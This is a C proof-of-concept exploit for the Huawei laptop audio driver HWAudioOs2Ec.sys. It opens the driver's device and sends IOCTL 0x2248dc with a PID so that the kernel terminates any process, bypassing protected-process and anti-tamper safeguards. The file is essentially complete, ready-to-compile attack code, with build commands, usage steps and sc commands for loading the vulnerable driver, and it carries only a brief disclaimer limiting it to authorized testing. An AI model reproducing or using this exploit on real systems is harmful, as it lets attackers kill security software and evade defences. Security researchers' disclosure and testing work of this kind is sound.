// Exploit for HWAudioOs2Ec.sys arbitrary process termination
// "HWAudioOs2Ec.sys" (SHA256: 5ABE477517F51D81061D2E69A9ADEBDCDA80D36667D0AFABE103FDA4802D33DB)

/*
 * PoC: HWAudioOs2Ec.sys - Arbitrary Process Termination
 *
 * VULNERABILITY SUMMARY:
 *   Driver:    HWAudioOs2Ec.sys (Huawei laptop audio driver)
 *   Device:    \\.\HWAudioX64
 *   IOCTL:     0x2248dc
 *   Method:    METHOD_BUFFERED (SystemBuffer)
 *   Input:     4 bytes - target process PID (DWORD)
 *   Output:    none
 *   Access:    SYSTEM / Administrators (SDDL restricted)
 *   Impact:    Terminate any process including protected/PPL processes
 *
 * VULNERABILITY FLOW:
 *   1. User sends 4-byte PID via DeviceIoControl
 *   2. Driver copies PID from SystemBuffer via memcpy_s to local variable
 *   3. Driver calls ZwOpenProcess(PROCESS_ALL_ACCESS, PID)
 *   4. Driver calls ZwTerminateProcess(handle)
 *   => Kernel-level process kill, bypasses user-mode protections
 *
 * COMPILE:
 *   "C:\Program Files\Microsoft Visual Studio\18\Community\VC\Auxiliary\Build\vcvarsall.bat" x64
 *   cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tcpoc.c /link /OUT:poc.exe /SUBSYSTEM:CONSOLE /MACHINE:x64
 *
 * USAGE:
 *   poc.exe <PID>
 *   (Requires Administrator privileges)
 *
 * WARNING: This PoC is for authorized security testing only.
 *          Use a sacrificial process (e.g., notepad.exe) for validation.
 */


#include <windows.h>
#include <stdio.h>
#include <psapi.h>

#define DEVICE_PATH     L"\\\\.\\HWAudioX64"
/*
 * IOCTL 0x2248dc breakdown:
 *   DeviceType  = FILE_DEVICE_UNKNOWN (0x22)
 *   Function    = 0x237  (custom)
 *   Method      = METHOD_BUFFERED (0)
 *   Access      = FILE_ANY_ACCESS (0)
 *
 * SystemBuffer is used (METHOD_BUFFERED)
 * InputBufferLength = 0x4, OutputBufferLength = 0x0
 */
#define IOCTL_KILL_PROCESS  0x2248dc

/* ---------------------------------------------------------------
 * Step 2: Open handle to the vulnerable driver
 *
 * The driver creates its device with SDDL restricting access to
 * SYSTEM (SY) and Administrators (BA). CreateFile will fail
 * without elevation.
 * --------------------------------------------------------------- */
HANDLE OpenTargetDriver(void){
    HANDLE hDevice = CreateFileW(
        DEVICE_PATH,
        GENERIC_READ|GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hDevice == INVALID_HANDLE_VALUE){
        DWORD err = GetLastError();
        if (err == ERROR_ACCESS_DENIED){
            printf("[!] Access denied. Run as Administrator. \n");
        } else if (err == ERROR_FILE_NOT_FOUND){
            printf("[!] Device not found. Is HWAudioOs2Ec.sys loaded?\n");
            printf("[!] Load with: \n");
            printf("    sc create HwAudio type= kernel binPath= C:\\path\\to\\HwAudioOs2Ec.sys\n");
            printf("    sc start HWAudio\n");
        } else {
            printf("[!] CreateFileW failed with error: %lu\n", err);
        }
        return INVALID_HANDLE_VALUE;
    }

    return hDevice;
}

/* ---------------------------------------------------------------
 * Step 3: Send kill IOCTL
 *
 * The driver's IOCTL handler for 0x2248dc:
 *   - Reads 4 bytes from SystemBuffer (the PID)
 *   - Copies via memcpy_s to a local variable
 *   - Passes PID to internal kill function
 *   - kill function: ZwOpenProcess(PROCESS_ALL_ACCESS) -> ZwTerminateProcess
 *
 * Because ZwOpenProcess runs in kernel context without
 * OBJ_FORCE_ACCESS_CHECK, it bypasses all user-mode process
 * protection (PPL, anti-tamper, etc.)
 * --------------------------------------------------------------- */
BOOL KillProcess(HANDLE hDevice, DWORD targetPid){
    DWORD bytesReturned = 0;
    /*
     * Input buffer layout (METHOD_BUFFERED):
     *   Offset 0x00, Size 4: Target PID (DWORD)
     *
     *   InputBufferLength = 0x4
     *   ClientId.UniqueProcess = SystemBuffer[31:0]
     */
    BOOL result = DeviceIoControl(
        hDevice,
        IOCTL_KILL_PROCESS,
        &targetPid,         /* lpInBuffer: 4-byte PID */
        sizeof(DWORD),      /* nInBufferSize: 0x4 */
        NULL,               /* lpOutBuffer: not used */
        0,                  /* nOutBufferSize: 0x0 */
        &bytesReturned,
        NULL
    );

    return result;
}

/* ---------------------------------------------------------------
 * Step 4: Verify the target process was terminated
 * --------------------------------------------------------------- */
BOOL IsProcessAlive(DWORD pid){
    DWORD aPids[4096];
    DWORD cbNeeded;

    if (!EnumProcesses(aPids, sizeof(aPids), &cbNeeded))
        return FALSE;

    DWORD cPids = cbNeeded / sizeof(DWORD);
    for (DWORD i = 0;i < cPids; i++){
        if (aPids[i] == pid)
            return TRUE;
    }
    return FALSE;
}

/* ---------------------------------------------------------------
 * Main
 * --------------------------------------------------------------- */
int main(int argc, char* argv[]){
    printf("==============================================\n");
    printf(" HWAudioOs2Ec.sys - Process Termination PoC by 2BCEB1(skybreaker)\n");
    printf(" IOCTL: 0x%X | Device: %ls\n", IOCTL_KILL_PROCESS, DEVICE_PATH);
    printf("==============================================\n\n");

    if (argc != 2){
        printf("Usage: %s <PID>\n\n", argv[0]);
        printf("Example (safe test):\n");
        printf("  1. Open notepad.exe\n");
        printf("  2. Find PID: tasklist | findstr notepad\n");
        printf("  3. Run: %s <notepad_pid>\n", argv[0]);
        return 1;
    }

    DWORD targetPid = (DWORD)atoi(argv[1]);
    if (targetPid == 0){
        printf("[!] Invalid PID: %s\n", argv[1]);
        return 1;
    }

    /* Verify target exists before exploit */
    printf("[>] 1. Checking target process (PID: %lu)...\n", targetPid);
    if (!IsProcessAlive(targetPid)){
        printf("[!] PID %lu is not running or not accessible.\n", targetPid);
        return 1;
    }
    printf("[+] Target process is alive.\n");

    /* Open driver */
    printf("[>] 2. Opening handle to %ls...\n",DEVICE_PATH);
    HANDLE hDevice = OpenTargetDriver();
    if (hDevice == INVALID_HANDLE_VALUE){
        return 1;
    }
    printf("[+] Got handle to driver.\n");

    /* Send kill IOCTL */
    printf("[>] 3. Sending IOCTL 0x%X with PID %lu...\n", IOCTL_KILL_PROCESS, targetPid);
    BOOL result = KillProcess(hDevice, targetPid);
    if (!result){
        printf("[!] DeviceIoControl failed: %lu\n", GetLastError());
        printf("[!] (Note: some drivers return FALSE even on success)\n");
    } else {
        printf("[+] IOCTL sent successfully.\n");
    }

    /* Verify termination */
    Sleep(500); /* Brief wait for kernel-side termination */
    printf("[>] 4. Verifying process termination...\n");
    if (!IsProcessAlive(targetPid)){
        printf("[+] SUCCESS: PID %lu had been terminated!\n", targetPid);
    } else {
        printf("[-] PID %lu is still alive.\n", targetPid);
        printf("[-]    The IOCTL may not be the kill handler, or the driver\n");
        printf("[-]    may have additional checks not seen during static analysis.\n");
    }

    CloseHandle(hDevice);
    return 0;
}
